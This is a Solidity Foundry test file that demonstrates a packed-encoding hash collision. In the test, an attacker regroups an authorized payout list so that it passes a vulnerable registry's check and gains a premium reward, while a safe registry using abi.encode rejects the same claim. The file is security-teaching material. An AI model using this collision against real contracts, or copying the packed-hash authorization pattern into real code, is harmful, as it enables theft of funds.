// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import { Test } from "@forge-std/Test.sol";
import { VulnerableRegistry } from "src/security/abi-hash-collision/VulnerableRegistry.sol";
import { SafeRoyaltyRegistry } from "src/security/abi-hash-collision/SafeRoyaltyRegistry.sol";

contract AbiHashCollisionTest is Test {
    VulnerableRegistry vulnerableRegistry;
    SafeRoyaltyRegistry safeRegistry;

    address alice;
    address bob;
    address charlie;

    function setUp() public {
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");

        vulnerableRegistry = new VulnerableRegistry(address(this));
        safeRegistry = new SafeRoyaltyRegistry(address(this));
    }

    function test_packedEncodingCollision() public {
        address[] memory privileged1 = new address[](1);
        privileged1[0] = alice;

        address[] memory regular1 = new address[](2);
        regular1[0] = bob;
        regular1[1] = charlie;

        address[] memory privileged2 = new address[](2);
        privileged2[0] = alice;
        privileged2[1] = bob;

        address[] memory regular2 = new address[](1);
        regular2[0] = charlie;

        bytes32 hash1 = keccak256(abi.encodePacked(privileged1, regular1));

        bytes32 hash2 = keccak256(abi.encodePacked(privileged2, regular2));

        assertEq(hash1, hash2);
    }

    // Step 1: owner authorizes semantic structure A
    // Step 2: prove semantic structure B has identical packed hash
    // Step 3: attacker submits B
    // Step 4: authorization passes
    // Step 5: attacker gets premium reward
    function test_claimRewards_vulnerable() public {
        deal(address(vulnerableRegistry), 10 ether);

        // Authorized structure:
        //
        // privileged = [alice]
        // regular    = [charlie, bob]
        //
        // packed = alice | charlie | bob

        address[] memory privileged1 = new address[](1);
        privileged1[0] = alice;

        address[] memory regular1 = new address[](2);
        regular1[0] = charlie;
        regular1[1] = bob;

        vulnerableRegistry.registerAllowedPayouts(privileged1, regular1);

        // Malicious reinterpretation:
        //
        // privileged = [alice, charlie]
        // regular    = [bob]
        //
        // packed = alice | charlie | bob
        //
        // SAME BYTES, different semantic grouping.

        address[] memory privileged2 = new address[](2);
        privileged2[0] = alice;
        privileged2[1] = charlie;

        address[] memory regular2 = new address[](1);
        regular2[0] = bob;

        bytes32 authorizedHash = keccak256(abi.encodePacked(privileged1, regular1));
        bytes32 attackerHash = keccak256(abi.encodePacked(privileged2, regular2));

        assertEq(authorizedHash, attackerHash, "packed encodings should collide");

        vm.prank(charlie);
        vulnerableRegistry.claimRewards(privileged2, regular2);

        assertEq(alice.balance, 1 ether);
        assertEq(charlie.balance, 1 ether);
        assertEq(bob.balance, 0.1 ether);

        // Authorized:

        // Alice    premium  = 1 ETH
        // Charlie  regular  = 0.1 ETH
        // Bob      regular  = 0.1 ETH

        // Executed:

        // Alice    premium  = 1 ETH
        // Charlie  premium  = 1 ETH   ← exploit
        // Bob      regular  = 0.1 ETH
    }

    function test_claimRewards_safe() public {
        deal(address(safeRegistry), 10 ether);

        address[] memory privileged1 = new address[](1);
        privileged1[0] = alice;

        address[] memory regular1 = new address[](2);
        regular1[0] = charlie;
        regular1[1] = bob;

        safeRegistry.registerAllowedPayouts(privileged1, regular1);

        address[] memory privileged2 = new address[](2);
        privileged2[0] = alice;
        privileged2[1] = charlie;

        address[] memory regular2 = new address[](1);
        regular2[0] = bob;

        bytes32 authorizedHash = keccak256(abi.encode(privileged1, regular1));
        bytes32 attackerHash = keccak256(abi.encode(privileged2, regular2));

        assertNotEq(authorizedHash, attackerHash, "encodings should not collide");

        vm.prank(charlie);
        vm.expectRevert(SafeRoyaltyRegistry.UnauthorizedClaim.selector);
        safeRegistry.claimRewards(privileged2, regular2);

        address[] memory privileged3 = new address[](1);
        privileged3[0] = alice;

        address[] memory regular3 = new address[](2);
        regular3[0] = charlie;
        regular3[1] = bob;

        vm.prank(charlie);
        safeRegistry.claimRewards(privileged3, regular3);

        assertEq(alice.balance, 1 ether);
        assertEq(charlie.balance, 0.1 ether);
        assertEq(bob.balance, 0.1 ether);
    }
}
